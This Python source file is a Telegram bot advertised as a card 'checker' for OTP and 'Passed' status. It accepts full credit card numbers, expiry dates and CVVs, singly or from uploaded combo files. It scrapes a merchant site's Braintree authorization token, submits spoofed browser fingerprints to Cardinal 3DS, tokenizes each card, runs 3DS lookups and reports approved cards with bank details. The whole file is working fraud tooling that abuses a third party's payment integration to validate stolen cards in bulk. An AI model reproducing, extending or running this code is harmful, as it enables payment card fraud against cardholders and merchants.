import telebot
import time
import threading, cloudscraper
from telebot import types
import requests, random, os, pickle, re
from bs4 import BeautifulSoup
import uuid
from urllib.parse import urlencode
from random import choice, choices
import string
import base64
from faker import Faker
import faker
import json
import jwt
from user_agent import generate_user_agent

# Get token from environment variable
token = os.environ.get('TG_BOT_VISA')
if not token:
    raise ValueError("TG_BOT_VISA environment variable not set")

bot = telebot.TeleBot(token, parse_mode="HTML")

# Remove admin restrictions - make it work for everyone
stop = {}
user_gateways = {}
stop_flags = {} 
stopuser = {}
command_usage = {}

mes = types.InlineKeyboardMarkup()
mes.add(types.InlineKeyboardButton(text="Start Checking", callback_data="start"))

@bot.message_handler(commands=["start"])
def handle_start(message):
    sent_message = bot.send_message(chat_id=message.chat.id, text="💥 Starting...")
    time.sleep(1)
    name = message.from_user.first_name
    bot.edit_message_text(chat_id=message.chat.id,
                          message_id=sent_message.message_id,
                          text=f"Hi {name}, Welcome To Bassl Checker (Otp and Passed)",
                          reply_markup=mes)

@bot.callback_query_handler(func=lambda call: call.data == 'start')
def handle_start_button(call):
    name = call.from_user.first_name

    bot.send_message(call.message.chat.id, 
        ' - مرحباً بك في بوت فحص Otp And Passed ✅\n\n\nللفحص اليدوي(OTP) [/otp] و للكومبو فقط ارسل الملف.\n\nللفحص اليدوي(Passed) [/vbv] و للكومبو فقط ارسل الملف.\n\nاختر نوع الفحص وسيبدأ البوت بأعطائك البطاقات المفحوصة يوزر المطور @iazuh)')

    bot.edit_message_text(chat_id=call.message.chat.id,
                          message_id=call.message.message_id,
                          text=f"Hi {name}, Welcome To Saoud Checker (Brantree LookUp)",
                          reply_markup=mes)

def UniversalStripeChecker(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:  # Mo3gza
        yy = yy.split("20")[1]
    user = generate_user_agent()
    r = requests.Session()
    headers = {
        'authority': 'adresilo.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': 'https://www.google.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    response = r.get('https://adresilo.com/', headers=headers)
    js = response.text
    mi = re.search(r'authorization\s*:\s*["\']([^"\']+)["\']', js, re.IGNORECASE).group(1)
    dec = base64.b64decode(mi).decode('utf-8')
    au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': f'Bearer {au}',
        'braintree-version': '2018-05-10',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://adresilo.com',
        'pragma': 'no-cache',
        'referer': 'https://adresilo.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': user,
    }
    
    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': '240c46d1-4a79-41dc-af5c-a4465479ebab',
        },
        'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
        'operationName': 'ClientConfiguration',
    }
    
    response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    car = response.json()['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
    
    headers = {
        'authority': 'centinelapi.cardinalcommerce.com',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://adresilo.com',
        'pragma': 'no-cache',
        'referer': 'https://adresilo.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': user,
        'x-cardinal-tid': 'Tid-e8eb7f4d-e856-412f-a52a-acc189f415a7',
    }
    
    json_data = {
        'BrowserPayload': {
            'Order': {
                'OrderDetails': {},
                'Consumer': {
                    'BillingAddress': {},
                    'ShippingAddress': {},
                    'Account': {},
                },
                'Cart': [],
                'Token': {},
                'Authorization': {},
                'Options': {},
                'CCAExtension': {},
            },
            'SupportsAlternativePayments': {
                'cca': True,
                'hostedFields': False,
                'applepay': False,
                'discoverwallet': False,
                'wallet': False,
                'paypal': False,
                'visacheckout': False,
            },
        },
        'Client': {
            'Agent': 'SongbirdJS',
            'Version': '1.35.0',
        },
        'ConsumerSessionId': '0_d43f49a0-0351-4474-9434-3359c0785314',
        'ServerJWT': car,
    }
    
    response = r.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data)
    payload = response.json()['CardinalJWT']
    ali2 = jwt.decode(payload, options={"verify_signature": False})
    reid = ali2['ReferenceId']
    
    headers = {
        'authority': 'geo.cardinalcommerce.com',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://geo.cardinalcommerce.com',
        'pragma': 'no-cache',
        'referer': 'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=6250b0e7550bc35c4b6c1c09&tmEventType=PAYMENT&referenceId=0_d43f49a0-0351-4474-9434-3359c0785314&geolocation=false&origin=Songbird',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
    }
    
    json_data = {
        'Cookies': {
            'Legacy': True,
            'LocalStorage': True,
            'SessionStorage': True,
        },
        'DeviceChannel': 'Browser',
        'Extended': {
            'Browser': {
                'Adblock': True,
                'AvailableJsFonts': [],
                'DoNotTrack': 'unknown',
                'JavaEnabled': False,
            },
            'Device': {
                'ColorDepth': 24,
                'Cpu': 'unknown',
                'Platform': 'Linux armv81',
                'TouchSupport': {
                    'MaxTouchPoints': 5,
                    'OnTouchStartAvailable': True,
                    'TouchEventCreationSuccessful': True,
                },
            },
        },
        'Fingerprint': '1224948465f50bd65545677bc5d13675',
        'FingerprintingTime': 424,
        'FingerprintDetails': {
            'Version': '1.5.1',
        },
        'Language': 'ar-EG',
        'Latitude': None,
        'Longitude': None,
        'OrgUnitId': '6250b0e7550bc35c4b6c1c09',
        'Origin': 'Songbird',
        'Plugins': [],
        'ReferenceId': reid,
        'Referrer': 'https://adresilo.com/',
        'Screen': {
            'FakedResolution': False,
            'Ratio': 2.2222222222222223,
            'Resolution': '800x360',
            'UsableResolution': '800x360',
            'CCAScreenSize': '01',
        },
        'CallSignEnabled': None,
        'ThreatMetrixEnabled': False,
        'ThreatMetrixEventType': 'PAYMENT',
        'ThreatMetrixAlias': 'Default',
        'TimeOffset': -180,
        'UserAgent': user,
        'UserAgentDetails': {
            'FakedOS': False,
            'FakedBrowser': False,
        },
        'BinSessionId': '9b64aec3-f1d0-4c4b-ab62-9dbfaedba6b9',
    }
    
    response = r.post(
        'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
        cookies=r.cookies,
        headers=headers,
        json=json_data,
    )
    
    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': f'Bearer {au}',
        'braintree-version': '2018-05-10',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'pragma': 'no-cache',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': user,
    }
    
    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'dropin2',
            'sessionId': '240c46d1-4a79-41dc-af5c-a4465479ebab',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                    'billingAddress': {
                        'postalCode': '10080',
                    },
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    
    response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    tok = response.json()['data']['tokenizeCreditCard']['token']
    binn = response.json()['data']['tokenizeCreditCard']['creditCard']['bin']
    
    headers = {
        'authority': 'api.braintreegateway.com',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/json',
        'origin': 'https://adresilo.com',
        'pragma': 'no-cache',
        'referer': 'https://adresilo.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': user,
    }
    
    email = f"usergchkppljvcx{random.randint(1000,9999)}@gmail.com"
    json_data = {
        'amount': '15.00',
        'browserColorDepth': 24,
        'browserJavaEnabled': False,
        'browserJavascriptEnabled': True,
        'browserLanguage': 'ar-EG',
        'browserScreenHeight': 800,
        'browserScreenWidth': 360,
        'browserTimeZone': -180,
        'deviceChannel': 'Browser',
        'additionalInfo': {
            'acsWindowSize': '03',
            'email': email,
        },
        'challengeRequested': True,
        'bin': binn,
        'dfReferenceId': reid,
        'clientMetadata': {
            'requestedThreeDSecureVersion': '2',
            'sdkVersion': 'web/3.103.0',
            'cardinalDeviceDataCollectionTimeElapsed': 5,
            'issuerDeviceDataCollectionTimeElapsed': 2758,
            'issuerDeviceDataCollectionResult': True,
        },
        'authorizationFingerprint': au,
        'braintreeLibraryVersion': 'braintree/web/3.103.0',
        '_meta': {
            'merchantAppId': 'adresilo.com',
            'platform': 'web',
            'sdkVersion': '3.103.0',
            'source': 'client',
            'integration': 'custom',
            'integrationType': 'custom',
            'sessionId': '240c46d1-4a79-41dc-af5c-a4465479ebab',
        },
    }
    
    response = r.post(
        f'https://api.braintreegateway.com/merchants/47n4hmzccvn4744j/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
        headers=headers,
        json=json_data,
    )
    
    msg = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]

    if 'challenge_required' in msg:
        return '3DS Challenge Required'
    elif 'authenticate_attempt_successful' in msg:
        return '3DS Authenticate Attempt Successful'
    elif 'authenticate_frictionless_failed' in msg:
        return '3DS Authenticate Frictionless Failed'        
    elif 'authenticate_successful' in msg:        
        return '3DS Authenticate Successful'        
    else:
        return msg

def reg(cc):
    regex = r'\d+'
    matches = re.findall(regex, cc)
    match = ''.join(matches)
    n = match[:16]
    mm = match[16:18]
    yy = match[18:20]
    if yy == '20':
        yy = match[18:22]
        if n.startswith("3"):
            cvc = match[22:26]
        else:
            cvc = match[22:25]
    else:
        if n.startswith("3"):
            cvc = match[20:24]
        else:
            cvc = match[20:23]
    cc = f"{n}|{mm}|{yy}|{cvc}"
    if not re.match(r'^\d{16}$', n):
        return
    if not re.match(r'^\d{3,4}$', cvc):
        return
    return cc

@bot.message_handler(func=lambda message: message.text.lower().startswith('.vbv') or message.text.lower().startswith('/vbv'))
def my_ali4(message):
    name = message.from_user.first_name
    idt = message.from_user.id
    id = message.chat.id
    try:
        command_usage[idt]['last_time']
    except:
        command_usage[idt] = {
            'last_time': datetime.now()
        }
    if command_usage[idt]['last_time'] is not None:
        current_time = datetime.now()
        time_diff = (current_time - command_usage[idt]['last_time']).seconds
        if time_diff < 10:
            bot.reply_to(message, f"<b>Try again after {10-time_diff} seconds.</b>", parse_mode="HTML")
            return    
    ko = (bot.reply_to(message, "- Wait checking your card ...").message_id)
    try:
        cc = message.reply_to_message.text
    except:
        cc = message.text
    cc = str(reg(cc))
    if cc == 'None':
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''', parse_mode="HTML")
        return
    start_time = time.time()
    try:
        command_usage[idt]['last_time'] = datetime.now()
        bran = UniversalStripeChecker
        last = str(bran(cc))
    except Exception as e:
        last = 'Error'
        
    end_time = time.time()
    execution_time = end_time - start_time
    msg = f'''<strong>#Brantree_LookUp_(Passed) 🔥 [/vbv]
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">ϟ</a>] 𝐂𝐚𝐫𝐝: <code>{cc}</code>
[<a href="https://t.me/B">ϟ</a>] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>{'Approved Passed! ✅' if '3DS Authenticate Attempt Successful' in last or '3DS Authenticate Successful' in last else 'DECLINED! ❌'}</code>
[<a href="https://t.me/B">ϟ</a>] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{last}</code>
- - - - - - - - - - - - - - - - - - - - - - -
{str(dato(cc[:6]))}
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">⌥</a>] 𝐓𝐢𝐦𝐞: <code>{execution_time:.2f}'s</code>
[<a href="https://t.me/B">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: <a href='tg://user?id=8169349350'>𝐁𝐀𝐒𝐄𝐋 𝐂𝐇𝐊</a> []
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href='https://t.me/iazuh'>𝐁𝐀𝐒𝐄𝐋</a> - 🍀</strong>'''

    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML")

@bot.message_handler(func=lambda message: message.text.lower().startswith('.otp') or message.text.lower().startswith('/otp'))
def my_ali5(message):
    name = message.from_user.first_name
    idt = message.from_user.id
    id = message.chat.id
    try:
        command_usage[idt]['last_time']
    except:
        command_usage[idt] = {
            'last_time': datetime.now()
        }
    if command_usage[idt]['last_time'] is not None:
        current_time = datetime.now()
        time_diff = (current_time - command_usage[idt]['last_time']).seconds
        if time_diff < 10:
            bot.reply_to(message, f"<b>Try again after {10-time_diff} seconds.</b>", parse_mode="HTML")
            return    
    ko = (bot.reply_to(message, "- Wait checking your card ...").message_id)
    try:
        cc = message.reply_to_message.text
    except:
        cc = message.text
    cc = str(reg(cc))
    if cc == 'None':
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''', parse_mode="HTML")
        return
    start_time = time.time()
    try:
        command_usage[idt]['last_time'] = datetime.now()
        bran = UniversalStripeChecker
        last = str(bran(cc))
    except Exception as e:
        last = 'Error'
        
    end_time = time.time()
    execution_time = end_time - start_time
    msg = f'''<strong>#Brantree_LookUp_(OTP) 🔥 [/otp]
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">ϟ</a>] 𝐂𝐚𝐫𝐝: <code>{cc}</code>
[<a href="https://t.me/B">ϟ</a>] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>{'Approved OTP! ✅' if '3DS Challenge Required' in last else 'DECLINED! ❌'}</code>
[<a href="https://t.me/B">ϟ</a>] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{last}</code>
- - - - - - - - - - - - - - - - - - - - - - -
{str(dato(cc[:6]))}
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">⌥</a>] 𝐓𝐢𝐦𝐞: <code>{execution_time:.2f}'s</code>
[<a href="https://t.me/B">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: <a href='https://t.me/iazuh'>𝐁𝐀𝐒𝐄𝐋 𝐂𝐇𝐊</a> []
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href='https://t.me/iazuh'>𝐁𝐀𝐒𝐄𝐋</a> - 🍀</strong>'''

    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML")

@bot.message_handler(content_types=('document'))
def GTA(message):
    user_id = str(message.from_user.id)
    name = message.from_user.first_name or message.from_user.username or "User"

    bts = types.InlineKeyboardMarkup()
    soso = types.InlineKeyboardButton(text='Passed', callback_data='ottpa2')
    sool = types.InlineKeyboardButton(text='OTP', callback_data='ottpa3')
    bts.add(soso, sool)
    bot.reply_to(message, 'Select the type of examination', reply_markup=bts)
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        filename = f"com{user_id}.txt"
        with open(filename, "wb") as f:
            f.write(downloaded)
    except Exception as e:
        bot.send_message(message.chat.id, f"Error downloading file: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'ottpa2')
def GTR(call):
    def my_ali():
        user_id = str(call.from_user.id)
        passs = 0
        basl = 0
        tote = 0
        filename = f"com{user_id}.txt"
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text= "- Please Wait Processing Your File ..")
        with open(filename, 'r') as file:
            lino = file.readlines()
            total = len(lino)
            stopuser.setdefault(user_id, {})['status'] = 'start'
            for cc in lino:
                if stopuser.get(user_id, {}).get('status') == 'stop':
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text=f'''The Has Stopped Checker Passed. 🤓
                        
Approved! : {passs}
Declined! : {basl}
Total! : {passs + basl} / {total}
Dev! : @iazuh''')

                    return

                try:
                    start_time = time.time()
                    bran = UniversalStripeChecker
                    last = str(bran(cc))
                except Exception as e:
                    print(e)
                    last = "ERROR"
                mes = types.InlineKeyboardMarkup(row_width=1)
                cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
                status = types.InlineKeyboardButton(f"- Status! : {last} •", callback_data='u8')
                cm3 = types.InlineKeyboardButton(f"- Approved! ✅ : [ {passs} ] •", callback_data='x')
                cm4 = types.InlineKeyboardButton(f"- Declined! ❌ : [ {basl} ] •", callback_data='x')
                cm5 = types.InlineKeyboardButton(f"- Total! : [ {total} ] •", callback_data='x')
                stop = types.InlineKeyboardButton("[ Stop Checher! ]", callback_data='stop')
                mes.add(cm1, status, cm3, cm4, cm5, stop)
                end_time = time.time()
                execution_time = end_time - start_time
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=f'''- Checker To Passed ☑️
- Time: {execution_time:.2f}s''',
                    reply_markup=mes
                )
                    
                n = cc.split("|")[0]
                mm = cc.split("|")[1]
                yy = cc.split("|")[2]
                cvc = cc.split("|")[3].strip()
                
                cc = n+'|'+mm+'|'+yy+'|'+cvc
                msg = f'''<strong>#Brantree_LookUp_(Passed) 🔥
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">ϟ</a>] 𝐂𝐚𝐫𝐝: <code>{cc}</code>
[<a href="https://t.me/B">ϟ</a>] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Approved Passed! ✅</code>
[<a href="https://t.me/B">ϟ</a>] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{last}</code>
- - - - - - - - - - - - - - - - - - - - - - -
{str(dato(cc[:6]))}
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">⌥</a>] 𝐓𝐢𝐦𝐞: <code>{execution_time:.2f}'s</code>
[<a href="https://t.me/B">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: <a href='https://t.me/iazuh'>𝐁𝐀𝐒𝐄𝐋 𝐂𝐇𝐊</a> []
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href='https://t.me/iazuh'>𝐁𝐀𝐒𝐄𝐋</a> - 🍀</strong>'''

                if '3DS Authenticate Successful' in last or '3DS Authenticate Attempt Successful' in last:
                    passs += 1
                    bot.send_message(call.from_user.id, msg, parse_mode="HTML")
                else:
                    basl += 1
                time.sleep(7)

        bot.edit_message_text(
            chat_id=call.message.chat.id, 
            message_id=call.message.message_id,
            text=f'''The Inspection Was Completed By Passed Pro. 🥳
    
Approved!: {passs}
Declined!: {basl}
Total!: {passs + basl}
Dev!: @iazuh''')
                    
    my_thread = threading.Thread(target=my_ali)
    my_thread.start()

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    uid = str(call.from_user.id) 
    stopuser.setdefault(uid, {})['status'] = 'stop'
    try:
        bot.answer_callback_query(call.id, "Stopped ✅")
    except:
        pass

@bot.callback_query_handler(func=lambda call: call.data == 'ottpa3')
def GTR2(call):
    def my_ali2():
        user_id = str(call.from_user.id)
        passsi = 0
        basli = 0
        tote = 0
        filename = f"com{user_id}.txt"
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text= "- Please Wait Processing Your File ..")
        with open(filename, 'r') as file:
            lino = file.readlines()
            total = len(lino)
            stopuser.setdefault(user_id, {})['status'] = 'start'
            for cc in lino:
                if stopuser.get(user_id, {}).get('status') == 'stop':
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text=f'''The Has Stopped Checker OTP. 🤓
                        
Approved! : {passsi}
Declined! : {basli}
Total! : {passsi + basli} / {total}
Dev! : @iazuh''')

                    return

                try:
                    start_time = time.time()
                    bran = UniversalStripeChecker
                    last = str(bran(cc))
                except Exception as e:
                    print(e)
                    last = "ERROR"
                mes = types.InlineKeyboardMarkup(row_width=1)
                cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
                status = types.InlineKeyboardButton(f"- Status! : {last} •", callback_data='u8')
                cm3 = types.InlineKeyboardButton(f"- Approved! ✅ : [ {passsi} ] •", callback_data='x')
                cm4 = types.InlineKeyboardButton(f"- Declined! ❌ : [ {basli} ] •", callback_data='x')
                cm5 = types.InlineKeyboardButton(f"- Total! : [ {total} ] •", callback_data='x')
                stop = types.InlineKeyboardButton("[ Stop Checher! ]", callback_data='stop')
                mes.add(cm1, status, cm3, cm4, cm5, stop)
                end_time = time.time()
                execution_time = end_time - start_time
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=f'''- Checker To OTP ☑️
- Time: {execution_time:.2f}s''',
                    reply_markup=mes
                )
                    
                n = cc.split("|")[0]
                mm = cc.split("|")[1]
                yy = cc.split("|")[2]
                cvc = cc.split("|")[3].strip()
                
                cc = n+'|'+mm+'|'+yy+'|'+cvc
                msg = f'''<strong>#Brantree_LookUp_(OTP) 🔥
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">ϟ</a>] 𝐂𝐚𝐫𝐝: <code>{cc}</code>
[<a href="https://t.me/B">ϟ</a>] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Approved OTP! ✅</code>
[<a href="https://t.me/B">ϟ</a>] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{last}</code>
- - - - - - - - - - - - - - - - - - - - - - -
{str(dato(cc[:6]))}
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">⌥</a>] 𝐓𝐢𝐦𝐞: <code>{execution_time:.2f}'s</code>
[<a href="https://t.me/B">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: <a href='https://t.me/iazuh'>𝐁𝐀𝐒𝐄𝐋 𝐂𝐇𝐊</a> []
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/B">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href='https://t.me/iazuh'>𝐁𝐀𝐒𝐄𝐋</a> - 🍀</strong>'''

                if '3DS Challenge Required' in last:
                    passsi += 1
                    bot.send_message(call.from_user.id, msg, parse_mode="HTML")
                else:
                    basli += 1
                time.sleep(7)

        bot.edit_message_text(
            chat_id=call.message.chat.id, 
            message_id=call.message.message_id,
            text=f'''The Inspection Was Completed By OTP Pro. 🥳
    
Approved!: {passsi}
Declined!: {basli}
Total!: {passsi + basli}
Dev!: @iazuh''')
                    
    my_thread = threading.Thread(target=my_ali2)
    my_thread.start()

def dato(zh):
    try:
        api_url = requests.get("https://bins.antipublic.cc/bins/" + zh).json()
        brand = api_url["brand"]
        card_type = api_url["type"]
        level = api_url["level"]
        bank = api_url["bank"]
        country_name = api_url["country_name"]
        country_flag = api_url["country_flag"]
        mn = f'''[<a href="https://t.me/l">ϟ</a>] 𝐁𝐢𝐧: <code>{brand} - {card_type} - {level}</code>
[<a href="https://t.me/l">ϟ</a>] 𝐁𝐚𝐧𝐤: <code>{bank} - {country_flag}</code>
[<a href="https://t.me/l">ϟ</a>] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country_name} [ {country_flag} ]</code>'''
        return mn
    except Exception as e:
        print(e)
        return 'No info'

print('- Bot was run ..')
while True:
    try:
        bot.infinity_polling(none_stop=True)
    except Exception as e:
        print(f'- Was error : {e}')
        time.sleep(5)